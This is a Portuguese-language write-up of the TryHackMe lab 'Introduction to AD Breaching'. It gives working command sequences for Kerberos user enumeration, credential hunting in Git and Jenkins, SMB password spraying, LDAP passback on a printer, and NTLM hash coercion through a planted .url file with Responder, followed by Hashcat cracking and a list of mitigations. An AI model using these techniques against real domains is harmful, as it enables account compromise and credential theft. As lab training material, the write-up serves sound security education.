Intro to AD Breaching

Em um ambiente Active Directory, tudo começa com o primeiro conjunto de credenciais válidas. Sem elas, não dá para enumerar, mover-se lateralmente nem escalar privilégios. Este writeup acompanha a room Introduction to AD Breaching do TryHackMe — partindo de acesso de rede e nada mais, do reconhecimento à coerção de autenticação, até obter credenciais válidas de domínio.

O ambiente

O laboratório simula uma pequena rede corporativa sob o domínio thm.loc. Um controlador de domínio Windows, dois hosts membros e um servidor Linux que publica três serviços internos (Gitea, Jenkins e um painel de impressora) atrás de um proxy reverso Nginx.

Antes de qualquer ataque, o atacante precisa resolver os nomes do domínio. A forma recomendada é apontar o resolver para o DC, que também é o servidor DNS de thm.loc — isso habilita as consultas de registros SRV no reconhecimento.

# Opção 1 — usar o DC como servidor DNS (recomendado)
sudo systemctl disable --now systemd-resolved
echo "nameserver 192.168.12.100" | sudo tee /etc/resolv.conf

# Opção 2 — entradas estáticas em /etc/hosts (AttackBox)

192.168.12.51     SERVER1.thm.loc

1 · O que é breaching de AD

Breaching é o processo de obter o primeiro conjunto de credenciais válidas de AD partindo do zero. É a fase inicial de qualquer cadeia de ataque a Active Directory: sem esse primeiro login, não há como consultar o domínio por usuários, grupos, computadores, GPOs ou relações de confiança. A parte mais difícil costuma ser justamente conseguir esse primeiro pé dentro.

A superfície de ataque

  • SMB (445): shares, impressoras e administração remota. Alvo clássico de password spraying.
  • LDAP (389/636): consulta e gestão de objetos do AD. Dispositivos mal configurados guardam credenciais de bind.
  • HTTP/HTTPS: portais internos, plataformas de CI/CD e painéis de gestão vazam credenciais em logs, páginas de config e repositórios.
  • Kerberos (88): o protocolo de autenticação do domínio. A pré-autenticação permite validar se um usuário existe.
  • DNS (53): resolve os nomes do ambiente e ajuda a localizar DCs e servidores de e-mail via registros SRV/MX.

Numa engajamento real você parte de uma de duas posições: sem autenticação (black-box), que é o que este lab simula, ou já com credenciais de baixo privilégio (grey-box), pulando direto para a enumeração.

2 · Reconhecimento — enumeração de usuários

O objetivo aqui é montar uma lista de usuários válidos. Em um cenário real isso vem de OSINT (LinkedIn, GitHub, vazamentos, páginas “Sobre nós”). No lab já recebemos uma wordlist de nomes prováveis — basta validar quais existem de verdade no domínio.

O Kerbrute abusa da pré-autenticação do Kerberos: para cada usuário ele envia um AS-REQ e observa a resposta do KDC. Se o usuário não existe, volta KDC_ERR_C_PRINCIPAL_UNKNOWN; se existe, o KDC pede pré-autenticação. Isso não conta como tentativa de login falha, então não trava contas — mas gera o Event ID 4768 no DC, então não é totalmente silencioso.

kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt

Cada linha com [+] VALID USERNAME é uma conta confirmada. Essa lista vira o alvo do password spraying mais adiante. Vale também mapear a infraestrutura com DNS:

# Controladores de domínio
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
# KDC Kerberos
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
# Servidores de e-mail
nslookup -type=MX thm.loc 192.168.12.100
Sobre o formato de usuário

first.last — a saída do Kerbrute mostra contas como jane.smith, bob.taylor e admin.svc. Identificar o padrão permite gerar a lista inteira a partir de poucos nomes.

3 · Descoberta de credenciais em serviços expostos

Uma das formas mais eficazes de obter credenciais é procurá-las onde desenvolvedores e administradores as deixaram por descuido: repositórios Git, logs de CI/CD e arquivos de configuração. Mapeia para a técnica MITRE ATT&CK T1552 (Unsecured Credentials).

No repositório Git (Gitea)

Mesmo que um segredo tenha sido removido do arquivo atual, o histórico do Git preserva toda alteração. Navegue até http://git.thm.loc/megacorp-admin/webapp-deploy e vasculhe commits, arquivos de config (.env, config.php…) e pipelines. Manualmente ou com o TruffleHog:

# busca manual no histórico
git log -p | grep -i "password\|secret\|token\|key\|credential"
# varredura automatizada
trufflehog git file:///path/to/repo

No Jenkins

Jenkins é um prato cheio: instâncias com credenciais fracas/padrão (admin:admin) ou até acesso anônimo. Os segredos vazam no console output dos builds, no config.xml dos jobs, em variáveis de ambiente e nos arquivos de workspace. Acesse http://ci.thm.loc/ (login admin:admin) e leia os logs dos builds recentes:

curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"

Dica: não pare no primeiro achado. Mesmo com um par completo de credenciais, continue procurando — nomes de contas de serviço e padrões de senha ajudam no spraying da próxima etapa.

4 · Password spraying

Com a lista de usuários válidos em mãos, testamos uma única senha contra todos os usuários antes de passar para a próxima senha. É o oposto do brute-force (muitas senhas contra uma conta) e é o que nos mantém abaixo do limite de bloqueio de contas.

Antes de pulverizar: a política de bloqueio

nxc smb 192.168.12.100 -u 'validuser' -p 'validpass' --pass-pol — com threshold de 5 e janela de 30 min, dá para pulverizar com segurança até 4 senhas por janela. Sem nenhuma credencial, assuma o pior e pulverize uma senha por vez com folga entre as rodadas.

Primeiro, limpe a saída do Kerbrute para uma lista só de usuários; depois pulverize via SMB com o NetExec:

grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt

nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success

--continue-on-success é essencial: por padrão o NetExec para no primeiro sucesso, e numa pulverização queremos encontrar todas as contas que usam aquela senha. Como ler a saída:

  • [+] — autenticação bem-sucedida. É a credencial que queremos.
  • STATUS_LOGON_FAILURE — senha errada (resposta esperada na maioria).
  • STATUS_ACCOUNT_DISABLED — a conta existe, mas está desativada.
  • STATUS_ACCOUNT_LOCKED_OUT — pare imediatamente, você está travando contas.
  • (Pwn3d!) — a conta é admin local no alvo. Prêmio maior ainda.

Nota sobre a pergunta do THM: ela fala em “brute force attack”, mas a técnica usada aqui é password spraying. A resposta é simplesmente o número de contas que autenticaram com a senha pulverizada.

5 · Coerção de autenticação

Em vez de descobrir ou adivinhar credenciais, a coerção engana um dispositivo ou usuário para que ele envie material de autenticação a um listener controlado por nós. Mapeia para MITRE ATT&CK T1187 (Forced Authentication). Vemos duas técnicas: LDAP passback numa impressora e coerção via arquivo num share gravável.

LDAP passback na impressora

Impressoras e MFPs guardam credenciais LDAP (uma conta de serviço) para fazer bind no DC. A ideia é redirecionar essa conexão LDAP para a nossa máquina. Acesse http://printer.thm.loc/ (admin:admin), vá na config de LDAP, troque o IP do servidor LDAP pelo seu IP de tun0 e uma porta alternativa (3489, pois a 389 já está em uso na AttackBox) e salve.

# listener para capturar o bind em texto claro
nc -lvnp 3489

# depois, volte ao painel e clique em "Test Connection"
# a impressora envia o DN e a senha da conta de serviço:
# ...CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc

Valide a credencial com nxc smb 192.168.12.100 -u 'svc.ldap' -p 'SENHA'. Neste lab, a conta é válida porém desativada (STATUS_ACCOUNT_DISABLED) — ainda assim prova que a técnica funciona.

Coerção via arquivo .url

Ao abrir uma pasta, o Windows Explorer renderiza os ícones dos arquivos automaticamente. Um arquivo .url com o campo IconFile apontando para um caminho UNC na nossa máquina faz o Windows tentar autenticar via SMB — vazando o hash NTLMv2 do usuário, sem ele clicar em nada.

cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\SEU_IP_TUN0\icons\icon.ico
IconIndex=1
EOF
Dois detalhes que fazem diferença

O 'EOF' entre aspas é proposital: sem elas o bash interpreta as barras duplas e quebra o caminho UNC. E o @ no nome faz o arquivo ir para o topo da listagem no Explorer, sendo um dos primeiros ícones renderizados.

Suba o Responder para capturar o hash, coloque o arquivo no share gravável e espere um usuário navegar por ele:

sudo responder -I tun0

smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
smb: \> put @Shortcut.url

# no Responder, o hash NTLMv2 aparece:
# [SMB] NTLMv2-SSP Username : THM\sarah.jones
# [SMB] NTLMv2-SSP Hash     : sarah.jones::THM:...

O hash NTLMv2 (Net-NTLMv2) não serve para pass-the-hash — precisa ser quebrado offline com Hashcat no modo 5600:

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

6 · Mitigações

Entender as defesas te torna um atacante melhor: saber o que esperar ajuda a perceber quando o controle está ausente. Resumo das contramedidas por técnica:

  • Gestão de segredos: cofres (Vault, Key Vault), pre-commit hooks (TruffleHog/Gitleaks), rotação imediata ao detectar exposição, e mascarar segredos nos logs de CI/CD.
  • Políticas de senha: mínimo de 14+ caracteres, banir senhas comuns e padrões da organização, nada de senha-padrão única para novas contas, e monitorar falhas distribuídas (assinatura de um spray).
  • Hardening de dispositivos: trocar credenciais padrão, usar LDAPS (636) em vez de LDAP em texto claro (389), restringir acesso aos painéis e usar contas de serviço de baixo privilégio.
  • Segurança de shares e NTLM: menor privilégio nas permissões, monitorar arquivos .url/.lnk/.scf, forçar SMB signing, bloquear SMB (445) de saída no perímetro e exigir NTLMv2.

Conclusão

De zero credenciais a várias contas de domínio válidas, por caminhos diferentes. É essa a realidade do breaching de AD: raramente é uma técnica só que abre a porta — é a combinação de reconhecimento, descoberta oportunista e coerção criativa. Recapitulando o que a room cobre:

  • OSINT + validação de usuários com Kerbrute (pré-auth do Kerberos).
  • Descoberta de credenciais em Git (histórico de commits) e Jenkins (logs de build).
  • Password spraying com NetExec, respeitando a política de bloqueio.
  • LDAP passback numa impressora e coerção via arquivo .url com Responder + Hashcat.

Próximos passos do módulo: null sessions e binds LDAP anônimos, coerção avançada (PetitPotam, PrinterBug, DFSCoerce), relay de NTLM, envenenamento LLMNR/NBT-NS — tudo o que esta room deixou de fora de propósito.
